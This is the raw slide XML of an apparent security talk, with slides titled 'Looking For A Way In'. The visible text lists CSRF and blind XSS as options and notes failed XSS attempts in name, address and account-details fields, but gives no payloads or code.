          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="384" name="Google Shape;384;p50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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5" name="Google Shape;385;p50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="386" name="Google Shape;386;p50"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950325" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Lame </a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="387" name="Google Shape;387;p50"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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pic>
        <p:nvPicPr>
          <p:cNvPr id="388" name="Google Shape;388;p50"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298326" y="1252050"/>
            <a:ext cx="6899102" cy="3578575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="392" name="Shape 392"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="393" name="Google Shape;393;p51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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4" name="Google Shape;394;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="395" name="Google Shape;395;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950325" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Lame </a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="396" name="Google Shape;396;p51"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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pic>
        <p:nvPicPr>
          <p:cNvPr id="397" name="Google Shape;397;p51"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1520938" y="1353551"/>
            <a:ext cx="6453864" cy="3321651"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="401" name="Shape 401"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="402" name="Google Shape;402;p52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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3" name="Google Shape;403;p52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="404" name="Google Shape;404;p52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="774450" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Looking For A Way In</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="405" name="Google Shape;405;p52"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="406" name="Google Shape;406;p52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="4311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t/>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="407" name="Google Shape;407;p52"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="2616600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>CSRF OR BXSS </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>CSRF is lame </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>BXSS seems more fun</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>XSS in Name 🚫</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>XSS in Address 🚫</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="1" marL="914400" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="alphaLcPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>XSS in account details 🚫</a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="411" name="Shape 411"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="412" name="Google Shape;412;p53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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3" name="Google Shape;413;p53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="414" name="Google Shape;414;p53"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="415" name="Google Shape;415;p53"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="4311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t/>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="416" name="Google Shape;416;p53"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2189400" y="124550"/>
            <a:ext cx="4943925" cy="4894399"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>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3F3F3"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="420" name="Shape 420"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="421" name="Google Shape;421;p54"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8545425" y="4532900"/>
            <a:ext cx="451200" cy="466200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="dk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2" name="Google Shape;422;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="12" type="sldNum"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8352133" y="4569192"/>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solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="423" name="Google Shape;423;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="774450" y="266850"/>
            <a:ext cx="7595100" cy="985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5200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Russo One"/>
                <a:ea typeface="Russo One"/>
                <a:cs typeface="Russo One"/>
                <a:sym typeface="Russo One"/>
              </a:rPr>
              <a:t>Looking For A Way In</a:t>
            </a:r>
            <a:endParaRPr sz="5200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Russo One"/>
              <a:ea typeface="Russo One"/>
              <a:cs typeface="Russo One"/>
              <a:sym typeface="Russo One"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="424" name="Google Shape;424;p54"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="0"/>
            <a:ext cx="548700" cy="1518900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="CC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
        <p:nvSpPr>
          <p:cNvPr id="425" name="Google Shape;425;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="4311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t/>
            </a:r>
            <a:endParaRPr sz="1600">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="426" name="Google Shape;426;p54"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472125" y="1597150"/>
            <a:ext cx="8073300" cy="2970600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>CSRF OR BXSS </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="2000"/>
              <a:buFont typeface="Abhaya Libre SemiBold"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="2000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Abhaya Libre SemiBold"/>
                <a:ea typeface="Abhaya Libre SemiBold"/>
                <a:cs typeface="Abhaya Libre SemiBold"/>
                <a:sym typeface="Abhaya Libre SemiBold"/>
              </a:rPr>
              <a:t>CSRF is lame </a:t>
            </a:r>
            <a:endParaRPr sz="2000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Abhaya Libre SemiBold"/>
              <a:ea typeface="Abhaya Libre SemiBold"/>
              <a:cs typeface="Abhaya Libre SemiBold"/>
              <a:sym typeface="Abhaya Libre SemiBold"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-355600" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
